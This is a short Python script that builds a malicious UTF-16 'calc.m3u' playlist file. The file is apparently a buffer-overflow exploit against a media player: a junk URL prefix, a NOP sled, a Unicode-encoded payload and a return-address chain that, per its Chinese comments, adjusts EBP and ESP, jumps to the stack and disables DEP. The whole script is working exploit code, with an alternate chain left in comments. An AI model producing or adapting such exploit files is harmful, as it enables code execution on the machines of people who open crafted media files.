#!/usr/bin/env python
# -*- coding:utf-8 -*-
import codecs
import cStringIO
filename = 'calc.m3u'

junk = "http://a"

buffer = u"\u9090\u9090" * (200 - 61)

moonagirl = u'\uDB33\u6853\u6C72\u2020\u6E68\u6761\u6869\u6D20\u6F6F\u6968'
moonagirl += u'\u6120\u8B6D\u53C4\u5050\uB853\u07EA\u77D5\uD0FF\uB853'
moonagirl += u'\uCAFA\u7C81\uD0FF'

#shellcode = u"\ucccc\ucccc"
#shellcode += u"\ue252\u7c92" #MOV EAX,1 RETN 地址
shellcode = u'\u00cc\u00cc'
# shellcode += u'\u002d\u004f'
shellcode += u"\uaef5\u0078" #MOV EAX,1 RETN 地址
shellcode += u"\u8885\u5d1D" #修正 EBP
shellcode += u"\u4a19\u7c97" #增大 ESP
shellcode += u"\uc1B4\u7dC5" #jmp esp
shellcode += u"\uCD24\u7c93" #关闭 DEP 代码的起始位置
shellcode += u"\u33E9\uFFFF" #回跳指令
shellcode += u"\u90FF\u9090"

payload = junk + buffer + moonagirl + shellcode + buffer
data = codecs.open(filename,'w','UTF-16')
data.write(payload)
data.close()
print '[*] File created'
print '[*] With {} bytes'.format(len(payload))





# shellcode = ''
# shellcode += u"\ue252\u7c92" #MOV EAX,1 RETN 地址
# shellcode += u"\u8885\u5d1D" #修正 EBP
# shellcode += u"\u4a19\u7c97" #增大 ESP
# shellcode += u"\uc1B4\u7dC5" #jmp esp
# shellcode += u"\uCD24\u7c93" #关闭 DEP 代码的起始位置
# shellcode += u"\u33E9\uFFFF" #回跳指令
# shellcode += u"\u90FF\u9090"


